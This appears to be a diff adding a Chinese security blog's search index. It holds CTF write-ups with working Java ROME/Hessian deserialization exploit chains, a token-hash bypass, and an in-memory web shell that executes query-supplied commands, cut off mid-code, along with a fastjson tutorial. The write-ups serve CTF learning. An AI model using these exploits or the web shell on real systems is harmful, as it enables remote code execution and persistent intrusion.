@@ -1,0 +1,1067 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title>D^3CTF2022-shorter</title>
+    <url>/2022/05/28/CTF/D-3CTF2022-shorter/</url>
+    <content><![CDATA[<h2 id="利用点">利用点</h2>
+<ol>
+<li class="lvl-3">ROME1.0反序列化</li>
+<li class="lvl-3">JavaAssist缩短字节码长度</li>
+</ol>
+<span id="more"></span>
+<h2 id="代码审计">代码审计</h2>
+<h3 id="ROME反序列化">ROME反序列化</h3>
+<p>pom.xml发现可以打ROME</p>
+<img src="/2022/05/28/CTF/D-3CTF2022-shorter/1.png" class="">
+<h3 id="JavaAssist缩短字节码">JavaAssist缩短字节码</h3>
+<p>用ysoserial的payload来打发现字节码太长了，mainController限定了&lt;1956</p>
+<img src="/2022/05/28/CTF/D-3CTF2022-shorter/2.png" class="">
+<p>用javaAssist生成AbstractTranslet可以大幅度减小字节码长度，<strong>而且有几个方法可以不重写</strong>，这里封装了一个反射修改field的方法</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> TemplatesGeneratorPacked;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GetAbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] generate() <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;e&quot;</span>);</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">zuper</span> <span class="operator">=</span> pool.get(AbstractTranslet.class.getName());</span><br><span class="line">        clazz.setSuperclass(zuper);</span><br><span class="line"></span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;&#125;, clazz);</span><br><span class="line">        constructor.setBody(<span class="string">&quot;&#123;Runtime.getRuntime().exec(\&quot;calc\&quot;);&#125;&quot;</span>);</span><br><span class="line">        clazz.addConstructor(constructor);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> clazz.toBytecode();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> TemplatesGeneratorPacked;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> ReflectPacked.ValueGetterSetter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GetTemplatesImpl</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> TemplatesImpl <span class="title function_">getTemplatesImpl</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">byte</span>[][] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;GetAbstractTranslet.generate()&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();</span><br><span class="line">        ValueGetterSetter.setValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, bytes);</span><br><span class="line">        ValueGetterSetter.setValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line">        ValueGetterSetter.setValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span>  templates;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>而且,ysoserial的pop链子还能继续修改: ObjectBean可以省略，少了ObjectBean这样就能进一步缩短</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> TemplatesGeneratorPacked.GetTemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Manual</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Templates</span> <span class="variable">templates</span> <span class="operator">=</span> GetTemplatesImpl.getTemplatesImpl();</span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, templates);</span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class, toStringBean);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(equalsBean ,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(hashMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bs64 = Base64.getEncoder().encode(baos.toByteArray());</span><br><span class="line">        System.out.println(<span class="keyword">new</span> <span class="title class_">String</span>(bs64).length());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>现在就能够RCE了</p>
+<img src="/2022/05/28/CTF/D-3CTF2022-shorter/2.png" class="">
+<h2 id="完">完</h2>
+<blockquote>
+<p>版权属于：Ho1aAs<br>
+欢迎关注我的博客 ：<a href="https://holaasuka.github.io">https://holaasuka.github.io</a><br>
+版权声明：本文为原创，来源于上述网站，转载时须注明出处及本声明</p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>Java反序列化</tag>
+        <tag>ROME1.0反序列化</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>fastjson基础</title>
+    <url>/2022/06/17/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/fastjson%E5%9F%BA%E7%A1%80/</url>
+    <content><![CDATA[<p></p>
+<h2 id="前言">前言</h2>
+<h3 id="fastjson简介">fastjson简介</h3>
+<p>阿里开发的用于JavaBean序列化和反序列化的库</p>
+<p>主要方法： toJSONString() 和 parseObject() 。调用toJSONString方 法即可将对象转换成 JSON 字符串，parseObject 方法则反过来将 JSON 字符串转换成对象。</p>
+<h3 id="下载">下载</h3>
+<p>maven仓库下载</p>
+<blockquote>
+<p><a href="https://mvnrepository.com/artifact/com.alibaba/fastjson">mvnrepository.com/artifact/com.alibaba/fastjson</a></p>
+</blockquote>
+<h2 id="JSON-toJSONString">JSON.toJSONString()</h2>
+<h3 id="JavaBean的序列化">JavaBean的序列化</h3>
+<p>编写一个JavaBean</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> fastjson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.annotation.JSONField;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String id;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age, String id)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getId</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setId</span><span class="params">(String id)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>调用JSON.toJSONString(Object obj)即可序列化</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> fastjson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JSONtoString</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;foo&quot;</span>, <span class="number">23</span>, <span class="string">&quot;114514&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span> JSON.toJSONString(person);</span><br><span class="line">        System.out.println(jsonString);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>输出JSON格式的对象</p>
+<img src="/2022/06/17/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/fastjson%E5%9F%BA%E7%A1%80/1.png" class="">
+<p><strong>若属性是私有的，必须有 set 方法，否则无法反序列化</strong></p>
+<h3 id="List-JavaBean-的序列化">List&lt; JavaBean &gt;的序列化</h3>
+<p>序列化LIst可以用以下两种方式：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">JSONArray.toJSONString(List);</span><br><span class="line">JSON.toJSONString(List);</span><br></pre></td></tr></table></figure>
+<p>这两种方式的结果没有区别</p>
+<img src="/2022/06/17/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/fastjson%E5%9F%BA%E7%A1%80/2.png" class="">
+<h3 id="JSONField注解">@JSONField注解</h3>
+<h3 id="主要注解">主要注解</h3>
+<p>上面<strong>默认输出的顺序是按照首字母顺序</strong>，然而习惯是把主键放在最前面，这就要用到@JSONField()注解</p>
+<p>JSON常用注解来实现：</p>
+<ul class="lvl-0">
+<li class="lvl-3">
+<p>自定义属性顺序<code>@JSONField(ordinal = 0)</code></p>
+</li>
+<li class="lvl-3">
+<p>是否（反）序列化<code>@JSONField(serialize/deserialize = true)</code></p>
+</li>
+<li class="lvl-3">
+<p>指定别名<code>@JSONField(name = &quot;xxx&quot;)</code></p>
+</li>
+<li class="lvl-3">
+<p>类型<code>@JSONField(format=&quot;yyyyMMdd&quot;)</code></p>
+</li>
+</ul>
+<p><strong>注解可以放在变量声明和getter/setter方法，多个注解项用逗号分隔</strong></p>
+<h3 id="示例">示例</h3>
+<p>按照id在前name在后、不序列化age字段、并且id字段名大写的形式，输出上面的代码</p>
+<img src="/2022/06/17/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/fastjson%E5%9F%BA%E7%A1%80/3.png" class="">
+<img src="/2022/06/17/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/fastjson%E5%9F%BA%E7%A1%80/4.png" class="">
+<h2 id="JSON-parseObject">JSON.parseObject()</h2>
+<h3 id="指定JavaBean类">指定JavaBean类</h3>
+<p>传入JSON字符串+JavaBean类即可反序列化</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> fastjson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JSONparseObject</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;name\&quot;:\&quot;shimokitazawa\&quot;,\&quot;ID\&quot;:\&quot;114\&quot;, \&quot;age\&quot;:24&#125;&quot;</span>;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> JSON.parseObject(jsonString, Person.class);</span><br><span class="line">        System.out.println(person.getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><strong>可以发现：传入的顺序不影响反序列化</strong></p>
+<img src="/2022/06/17/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/fastjson%E5%9F%BA%E7%A1%80/5.png" class="">
+<p><strong>注意：JavaBean必须有无参数的构造器否则报错</strong></p>
+<img src="/2022/06/17/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/fastjson%E5%9F%BA%E7%A1%80/6.png" class="">
+<img src="/2022/06/17/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/fastjson%E5%9F%BA%E7%A1%80/7.png" class="">
+<h3 id="不指定JavaBean类（重点）需要设置-type">不指定JavaBean类（重点）需要设置@type</h3>
+<p>对于fastjson业务，一般不会指定类的，<strong>而是在反序列化字符串使用@type指定JavaBean类才会触发类加载</strong></p>
+<p>现在在JavaBean的setter中打印字符<img src="/2022/06/17/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/fastjson%E5%9F%BA%E7%A1%80/8.png" class="">然后在字符串中使用@type，反序列化</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> fastjson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JSONparseObject</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;fastjson.Person\&quot;, \&quot;name\&quot;:\&quot;shimokitazawa\&quot;,\&quot;ID\&quot;:\&quot;114\&quot;, \&quot;age\&quot;:24&#125;&quot;</span>;</span><br><span class="line">        JSON.parseObject(jsonString);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><strong>可以发现完成了JavaBean类的加载</strong></p>
+<img src="/2022/06/17/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/fastjson%E5%9F%BA%E7%A1%80/9.png" class="">
+<p><strong>如果没有@type则不会加载</strong></p>
+<img src="/2022/06/17/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/fastjson%E5%9F%BA%E7%A1%80/10.png" class="">
+<h2 id="序列化注意事项">序列化注意事项</h2>
+<h3 id="byte-的序列化">byte[]的序列化</h3>
+<p>会先base64编码，反序列化也会先解码</p>
+<img src="/2022/06/17/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/fastjson%E5%9F%BA%E7%A1%80/11.png" class="">
+<h2 id="反序列化注意事项">反序列化注意事项</h2>
+<h3 id="parse-和parseObject-的区别">parse()和parseObject()的区别</h3>
+<p>在getter/setter写入print：</p>
+<img src="/2022/06/17/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/fastjson%E5%9F%BA%E7%A1%80/12.png" class="">
+<p>可以看出：<strong>parse只调用了set，而parseObject还调用了getter</strong></p>
+<img src="/2022/06/17/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/fastjson%E5%9F%BA%E7%A1%80/13.png" class="">
+<h3 id="无setter的private属性的反序列化">无setter的private属性的反序列化</h3>
+<p>无setter的private属性需要指定参数<code>Feature.SupportNonPublicField</code>才能完成反序列化操作</p>
+<img src="/2022/06/17/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/fastjson%E5%9F%BA%E7%A1%80/14.png" class="">
+<h3 id="对下划线、横杠的过滤">对下划线、横杠的过滤</h3>
+<p>反序列化会自动过滤下划线、横杠、竖线</p>
+<img src="/2022/06/17/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/fastjson%E5%9F%BA%E7%A1%80/15.png" class="">
+<h2 id="参考">参考</h2>
+<blockquote>
+<p><a href="https://www.runoob.com/w3cnote/fastjson-intro.html">Fastjson 简明教程</a></p>
+</blockquote>
+<h2 id="完-2">完</h2>
+<blockquote>
+<p>版权属于：Ho1aAs<br>
+欢迎关注我的博客 ：<a href="https://holaasuka.github.io">https://holaasuka.github.io</a><br>
+版权声明：本文为原创，来源于上述网站，转载时须注明出处及本声明</p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>Java安全基础知识</category>
+      </categories>
+      <tags>
+        <tag>Java安全基础</tag>
+        <tag>fastjson</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>hfctf2022-ezchain</title>
+    <url>/2022/05/27/CTF/hfctf2022-ezchain/</url>
+    <content><![CDATA[<h2 id="利用点-2">利用点</h2>
+<ol>
+<li class="lvl-3">ROME不出网反序列化</li>
+<li class="lvl-3">ROME二次反序列化</li>
+</ol>
+<span id="more"></span>
+<h2 id="代码审计-2">代码审计</h2>
+<p>Index是一个Hessian服务器，handle里面绕过token验证后进行了Hessian2Input反序列化</p>
+<img src="/2022/05/27/CTF/hfctf2022-ezchain/1.png" class="">
+<h3 id="String-hashCode-绕过">String.hashCode()绕过</h3>
+<p>String.hashCode()是基于ascii码计算的</p>
+<img src="/2022/05/27/CTF/hfctf2022-ezchain/2.png" class="">
+<p>那么保证前两位HF替换成同样值的字符就行了，HF可以用Ge绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?token=GeCTF2022</span><br></pre></td></tr></table></figure>
+<img src="/2022/05/27/CTF/hfctf2022-ezchain/3.png" class="">
+<h3 id="ROME二次反序列化">ROME二次反序列化</h3>
+<p>发现有个ROME1.7的包，肯定是用它来打了，可以用jdbcRowSetImpl打jndi，但是根据docker可以看出是不出网的，所以要不出网利用。</p>
+<p>之后尝试TemplatesImpl，但是_transient修饰的tfactory在hessian2Input.readObject()怎么也传不进去，用原生类是可以传的。</p>
+<p>找到一个java/security/SignedObject.java，它有一个getObject方法进行了反序列化</p>
+<img src="/2022/05/27/CTF/hfctf2022-ezchain/4.png" class="">
+<p>那么这里就可以利用BadAttributeValueExpException+ROME来调用这个SignedObject.getObject()，不出网利用就写一个内存马在getObject()反序列化，完成调用</p>
+<p>下面用y4tacker的代码来复现：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Output;</span><br><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.security.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> marshalsec.util.Reflections.setFieldValue;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> marshalsec.gadgets.JDKUtil;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PoC</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code = ClassPool.getDefault().get(<span class="string">&quot;MemoryTrojan&quot;</span>).toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;jiang&quot;</span>);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">bean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class,templates);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">1</span>);</span><br><span class="line">        setFieldValue(badAttributeValueExpException,<span class="string">&quot;val&quot;</span>,bean);</span><br><span class="line"></span><br><span class="line">        KeyPairGenerator keyPairGenerator;</span><br><span class="line">        keyPairGenerator = KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        keyPairGenerator.initialize(<span class="number">1024</span>);</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">keyPair</span> <span class="operator">=</span> keyPairGenerator.genKeyPair();</span><br><span class="line">        <span class="type">PrivateKey</span> <span class="variable">privateKey</span> <span class="operator">=</span> keyPair.getPrivate();</span><br><span class="line">        <span class="type">Signature</span> <span class="variable">signingEngine</span> <span class="operator">=</span> Signature.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">SignedObject</span> <span class="variable">so</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>(badAttributeValueExpException, privateKey, signingEngine);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">delegate</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(SignedObject.class, so);</span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">root</span>  <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ObjectBean.class, delegate);</span><br><span class="line">        HashMap&lt;Object, Object&gt; map = JDKUtil.makeMap(root, root);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">Hessian2Output</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Output</span>(os);</span><br><span class="line">        output.writeObject(map);</span><br><span class="line">        output.getBytesOutputStream().flush();</span><br><span class="line">        output.completeMessage();</span><br><span class="line">        output.close();</span><br><span class="line">        System.out.println(<span class="keyword">new</span> <span class="title class_">String</span>(Base64.getEncoder().encode(os.toByteArray())));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.net.httpserver.HttpContext;</span><br><span class="line"><span class="keyword">import</span> com.sun.net.httpserver.HttpExchange;</span><br><span class="line"><span class="keyword">import</span> com.sun.net.httpserver.HttpHandler;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MemoryTrojan</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title class_">HttpHandler</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handle</span><span class="params">(HttpExchange t)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">response</span> <span class="operator">=</span> <span class="string">&quot;Y4tacker&#x27;s MemoryShell&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">query</span> <span class="operator">=</span> t.getRequestURI().getQuery();</span><br><span class="line">        String[] var3 = query.split(<span class="string">&quot;=&quot;</span>);</span><br><span class="line">        System.out.println(var3[<span class="number">0</span>]+var3[<span class="number">1</span>]);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">output</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (var3[<span class="number">0</span>].equals(<span class="string">&quot;y4tacker&quot;</span>))&#123;</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Runtime.getRuntime().exec(var3[<span class="number">1</span>]).getInputStream();</span><br><span class="line">            output = <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">4096</span>];</span><br><span class="line">            <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span> (-<span class="number">1</span> != (n = inputStream.read(buffer))) &#123;</span><br><span class="line">                output.write(buffer, <span class="number">0</span>, n);</span><br><span class="line">            